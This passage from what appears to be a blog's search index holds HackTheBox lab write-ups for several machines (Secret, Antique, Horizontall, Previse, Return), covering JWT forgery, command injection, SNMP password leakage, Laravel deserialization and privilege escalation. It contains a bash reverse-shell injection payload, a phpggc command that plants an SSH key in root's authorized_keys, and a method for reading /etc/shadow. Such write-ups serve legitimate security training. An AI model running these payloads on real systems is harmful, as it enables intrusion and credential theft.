Sep 3 2021 public drwxr-xr-x 2 kali kali 4.0K Sep 3 2021 routes drwxr-xr-x 4 kali kali 4.0K Aug 13 2021 src -rw-r--r-- 1 kali kali 651 Aug 13 2021 validations.js We have a .env and .git Let\u0026rsquo;s check the commit 67d8da7, which removed TOKEN_SECRET â””â”€$ git show 67d8da7 commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:30:17 2021 +0530 removed .env for security reasons diff --git a/.env b/.env index fb6f587..31db370 100644 --- a/.env +++ b/.env @@ -1,2 +1,2 @@ DB_CONNECT = \u0026#39;mongodb://127.0.0.1:27017/auth-web\u0026#39; -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE +TOKEN_SECRET = secret Okay, now we can check source files and find where this token is used The token is used to sing jwt token when user logins We have forgot.js and private.js files In private.js we have /logs route which checks if user is theadmin Notice that git log --oneline ${file} is supplied to exec function, so potential command injection Let\u0026rsquo;s forge the jwt token for theadmin user I used https://jwt.io/ Now we can try command injection Let\u0026rsquo;s ping our attack box And we get our revshell Root Enumerate /opt has custom count binary with suid bit dasith@secret:/opt$ ls -lha total 56K drwxr-xr-x 2 root root 4.0K Oct 7 2021 . drwxr-xr-x 20 root root 4.0K Oct 7 2021 .. -rw-r--r-- 1 root root 3.7K Oct 7 2021 code.c -rw-r--r-- 1 root root 16K Oct 7 2021 .code.c.swp -rwsr-xr-x 1 root root 18K Oct 7 2021 count -rw-r--r-- 1 root root 4.6K Oct 7 2021 valgrind.log According to source file, the binary gets the stats of the file/directory Then it drops the privileges int main() { char path[100]; int res; struct stat path_s; char summary[4096]; printf(\u0026#34;Enter source file/directory name: \u0026#34;); scanf(\u0026#34;%99s\u0026#34;, path); getchar(); stat(path, \u0026amp;path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(\u0026#34;Save results a file? [y/N]: \u0026#34;); res = getchar(); if (res == 121 || res == 89) { printf(\u0026#34;Path: \u0026#34;); scanf(\u0026#34;%99s\u0026#34;, path); FILE *fp = fopen(path, \u0026#34;a\u0026#34;); if (fp != NULL) { fputs(summary, fp); fclose(fp); } else { printf(\u0026#34;Could not open %s for writing\\n\u0026#34;, path); } } return 0; } We see the comment // Enable coredump generation, which is a hint We can supply a file, send SIGSEGV (kill -SIGSEGV or kill -11) and read that file from the dump Let\u0026rsquo;s try with /etc/shadow We can use apport-unpack to unpack dump file If we check CoreDump we see the content of the /etc/shadow So now we can either dump id_rsa of the root or crack the hash ","date":"August 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/secret/images/secret.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/secret/","summary":"Secret Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.120 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 14:59 BST Nmap scan report for 10.10.11.120 (10.10.11.120) Host is up (0.18s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.","tags":["HTB","jwt pyjwt express","api","source-code","git","command-injection","suid","crash-dump","var-crash","appport-unpack","core-dump"],"title":"[HTB] Machine: Secret"},{"categories":null,"contents":"Antique Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.107 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 15:59 BST Nmap scan report for 10.10.11.107 (10.10.11.107) Host is up (0.12s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: | JetDirect | Password: | NULL: |_ JetDirect 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port23-TCP:V=7.94%I=7%D=8/9%Time=64D3A9E6%P=x86_64-pc-linux-gnu%r(NULL, SF:F,\u0026#34;\\nHP\\x20JetDirect\\n\\n\u0026#34;)%r(GenericLines,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPass SF:word:\\x20\u0026#34;)%r(tn3270,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(GetRequ SF:est,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(HTTPOptions,19,\u0026#34;\\nHP\\x20 SF:JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(RTSPRequest,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPas SF:sword:\\x20\u0026#34;)%r(RPCCheck,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(DNSV SF:ersionBindReqTCP,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(DNSStatusRe SF:questTCP,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(Help,19,\u0026#34;\\nHP\\x20Je SF:tDirect\\n\\nPassword:\\x20\u0026#34;)%r(SSLSessionReq,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPas SF:sword:\\x20\u0026#34;)%r(TerminalServerCookie,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\ SF:x20\u0026#34;)%r(TLSSessionReq,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(Kerber SF:os,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(SMBProgNeg,19,\u0026#34;\\nHP\\x20Je SF:tDirect\\n\\nPassword:\\x20\u0026#34;)%r(X11Probe,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword SF::\\x20\u0026#34;)%r(FourOhFourRequest,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r( SF:LPDString,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(LDAPSearchReq,19,\u0026#34; SF:\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(LDAPBindReq,19,\u0026#34;\\nHP\\x20JetDirec SF:t\\n\\nPassword:\\x20\u0026#34;)%r(SIPOptions,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x2 SF:0\u0026#34;)%r(LANDesk-RC,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(TerminalSer SF:ver,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(NCP,19,\u0026#34;\\nHP\\x20JetDirec SF:t\\n\\nPassword:\\x20\u0026#34;)%r(NotesRPC,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34; SF:)%r(JavaRMI,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(WMSRequest,19,\u0026#34;\\ SF:nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(oracle-tns,19,\u0026#34;\\nHP\\x20JetDirect\\ SF:n\\nPassword:\\x20\u0026#34;)%r(ms-sql-s,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)% SF:r(afp,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(giop,19,\u0026#34;\\nHP\\x20JetDi SF:rect\\n\\nPassword:\\x20\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 181.59 seconds telnet â””â”€$ telnet 10.10.11.107 Trying 10.10.11.107... Connected to 10.10.11.107. Escape character is \u0026#39;^]\u0026#39;. HP JetDirect Password: admin Invalid password Connection closed by foreign host. Nothing to see, so I scanned UDP ports â””â”€$ sudo nmap -sU -sV 10.10.11.107 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 16:38 BST Stats: 0:09:01 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan Nmap scan report for 10.10.11.107 (10.10.11.107) Host is up (0.10s latency). Not shown: 999 closed udp ports (port-unreach) PORT STATE SERVICE VERSION 161/udp open snmp SNMPv1 server (public) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1013.71 seconds snmp â””â”€$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1.2.1 = STRING: \u0026#34;HTB Printer\u0026#34; Foothold/User According to this post we can retrieve password We need to ask for .1.3.6.1.4.1.11.2.3.9.1.1.13.0 â””â”€$ snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0 iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 Now we need to convert it from hex to ascii Try password for telnet P@ssw0rd@123!!123 Let\u0026rsquo;s call help menu Now let\u0026rsquo;s try get execution and reverse shell Root Enumeration shows port 631 open lp@antique:~$ netstat -tulnp (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN 1016/python3 tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp6 0 0 ::1:631 :::* LISTEN - udp 0 0 0.0.0.0:161 0.0.0.0:* We can perform port forwarding using chisel Or check the list of processes and take a guess We see cups service Checking config shows that indeed port 631 belongs to cups If we curl we see the version is 1.6.1 If we check github post We see that we need to call cupsctl ErrorLog={FILE} And then curl 127.0.0.1:631/admin/log/error_log? So let\u0026rsquo;s read shadow file It works, but it\u0026rsquo;s not crackable ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/antique/images/antique.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/antique/","summary":"Antique Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.107 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 15:59 BST Nmap scan report for 10.10.11.107 (10.10.11.107) Host is up (0.12s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: | JetDirect | Password: | NULL: |_ JetDirect 1 service unrecognized despite returning data.","tags":["HTB","printer","jetdirect","telnet","snmp","snmpwalk","cups","cve-2012-5519","hashcat","shadow"],"title":"[HTB] Machine: Antique"},{"categories":null,"contents":"Horizontall Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.105 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 17:34 BST Nmap scan report for 10.10.11.105 (10.10.11.105) Host is up (0.16s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50ðŸ’¿ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://horizontall.htb |_http-server-header: nginx/1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.09 seconds Web Server gobuster â””â”€$ gobuster dir -u http://horizontall.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://horizontall.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/15 17:54:27 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/img/] /css (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/css/] /js (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/js/] ffuf â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://10.10.11.105/\u0026#39; -H \u0026#39;Host: FUZZ.horizontall.htb\u0026#39; -fw 7 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.105/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.horizontall.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response words: 7 ________________________________________________ [Status: 200, Size: 901, Words: 43, Lines: 2, Duration: 109ms] * FUZZ: www We find another vhost in js file Foothold/User http://api-prod.horizontall.htb/reviews Let\u0026rsquo;s gobuster again â””â”€$ gobuster dir -u http://api-prod.horizontall.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://api-prod.horizontall.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/15 17:59:30 Starting gobuster in directory enumeration mode =============================================================== /reviews (Status: 200) [Size: 507] /users (Status: 403) [Size: 60] /admin (Status: 200) [Size: 854] http://api-prod.horizontall.htb/admin We have strapi Let\u0026rsquo;s check exploits Googling shows exploit to reset admin password http://api-prod.horizontall.htb/admin/strapiVersion We have strapiVersion\t\u0026quot;3.0.0-beta.17.4\u0026quot; Another exploit with RCE Let\u0026rsquo;s try them Now let\u0026rsquo;s try RCE There\u0026rsquo;s a nice blog with POC We can open the same request in Burp Add Content-Type and Authorization headers Copy the payload from the post and send it Root Let\u0026rsquo;s enumerate We have port 8000 strapi@horizontall:~$ netstat -tulpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN 1802/node /usr/bin/ tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - We can either upload chisel or use ssh port forwarding, If we use ssh version, we don\u0026rsquo;t have .ssh folder and authorized_keys for strapi Let\u0026rsquo;s try and create them Let\u0026rsquo;s add public key to authorized_keys so we can ssh We have Laravel Let\u0026rsquo;s gobuster â””â”€$ gobuster dir -u http://localhost:8000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://localhost:8000/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/15 18:52:07 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 17473] /server.php (Status: 200) [Size: 17473] /profiles (Status: 500) [Size: 616200] /profiles Looks like debug mode is on Laravel If we google for laravel debug mode exploit We have a post And poc Let\u0026rsquo;s try Generate payload php -d'phar.readonly=0' ~/Documents/Tools/phpggc/phpggc --phar phar -o ssh.phar --fast-destruct monolog/rce1 system 'mkdir -p /root/.ssh; echo \u0026quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo+qtyTekC0IbR253hJRsWT9Q+wCFVUEwHS7/VZJEOvePL+oIm2LZp9G1ml3FToU6Qr2MtB83tJU7mMFqcKm3mfVTj+lpJzP+XO4A/xHzLiqhZScv56FM0JaZqz65/Oca4FF4AiNS0gOwJ7vu5sARMYFbb5jsd266eCFvymRLobt3Ujzo5lqcRiLOgZPVCasfHU0vPCNGTaMvDKyklhwSCsMbKjOxuozbwZwJ1ApsCkkx7bx277DGgOI6G/rLYFkc/W/+Y9hxqp4RifUzgu6GACKDIKyAnszWxZHNMT/Iokkcn35Xd5p/ykVgrjLBDQKCxTr4Org/M7L9xhvd19GbH kali@kali\u0026quot; \u0026gt;\u0026gt; /root/.ssh/authorized_keys' And run exploit ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/horizontall/images/horizontall.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/horizontall/","summary":"Horizontall Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.105 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 17:34 BST Nmap scan report for 10.10.11.105 (10.10.11.105) Host is up (0.16s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50ðŸ’¿ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.","tags":["HTB","vhosts","strapi","cve-2019-18818","cve-2019-19609","command-injection","laravel","phpggc","deserialization"],"title":"[HTB] Machine: Horizontall"},{"categories":null,"contents":"Previse Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.104 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 20:03 BST Nmap scan report for 10.10.11.104 (10.10.11.104) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.90 seconds Web Server If we check burp we can see that visiting / redirects to login.php But / page also returns a valid full page It\u0026rsquo;s a execution after redirect (EAR) vulnerability gobuster â””â”€$ gobuster dir -u http://10.10.11.104 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.104 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/08/16 16:07:17 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 2801] [--\u0026gt; login.php] /.php (Status: 403) [Size: 277] /download.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [--\u0026gt; login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.104/css/] /status.php (Status: 302) [Size: 2966] [--\u0026gt; login.php] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.104/js/] /logout.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /accounts.php (Status: 302) [Size: 3994] [--\u0026gt; login.php] /config.php (Status: 200) [Size: 0] /logs.php (Status: 302) [Size: 0] [--\u0026gt; login.php] Foothold If we check response from / page, we also see other endpoints:\nstatus.php files.php file_logs.php accounts.php So in order to check pages, we can intercept response and change status code to 200 OK\nIf we visit accounts.php, we see that we shouldn\u0026rsquo;t access that page Let\u0026rsquo;s create a user Now we can check other pages We found source files in /files.php logs.php has exec() function call $output = exec(\u0026quot;/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\u0026quot;); If we request data, we have I tried injecting id and other stuff, but had no success But when I tried pinging my attack box, I got connection So now let\u0026rsquo;s get reverse shell delim=comma;bash -c 'bash -i \u0026gt;%26 /dev/tcp/10.10.16.4/6666 0\u0026gt;%261' Upgrade shell with python or script /dev/null -c bash User Enumerate the box Nothing found, except the access to db config.php from source files Let\u0026rsquo;s crack the hash It might take a while hashcat -m 500 hash /usr/share/wordlists/rockyou.txt m4lwhere:ilovecody112235! ssh using the creds Root Enumerate again sudo -l Check the content m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz gzip is used without full path So let\u0026rsquo;s create our script called gzip Modify the PATH and run the script ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/previse/images/previse.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/previse/","summary":"Previse Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.104 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 20:03 BST Nmap scan report for 10.10.11.104 (10.10.11.104) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","execute-after-redirect","source-code","php injection","command-injection","path-hijack","hashcat","sudo"],"title":"[HTB] Machine: Previse"},{"categories":null,"contents":"Return Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.108 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 16:41 BST Stats: 0:05:48 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 62.24% done; ETC: 16:50 (0:03:31 remaining) Warning: 10.10.11.108 giving up on port because retransmission cap hit (6). Stats: 0:14:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.03% done; ETC: 16:56 (0:00:09 remaining) Nmap scan report for 10.10.11.108 (10.10.11.108) Host is up (0.12s latency). Not shown: 65483 closed tcp ports (conn-refused), 28 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49679/tcp open unknown 49682/tcp open unknown 49694/tcp open unknown 64731/tcp open unknown â””â”€$ nmap -sC -sV -Pn 10.10.11.108 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 18:52 BST Nmap scan report for 10.10.11.108 (10.10.11.108) Host is up (0.19s latency). Not shown: 990 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: HTB Printer Admin Panel |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-09 18:11:46Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-08-09T18:12:01 |_ start_date: N/A |_clock-skew: 18m01s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 94.64 seconds smb â””â”€$ smbclient -N -L //10.10.11.108 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available gobuster â””â”€$ gobuster dir -u http://10.10.11.108/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.108/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/10 15:50:19 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.108/images/] /index.php (Status: 200) [Size: 28274] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.108/Images/] /Index.php (Status: 200) [Size: 28274] /settings.php (Status: 200) [Size: 29090] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.108/IMAGES/] /INDEX.php (Status: 200) [Size: 28274] Web Server Foothold/User If we visit http://10.10.11.108/settings.php We have a 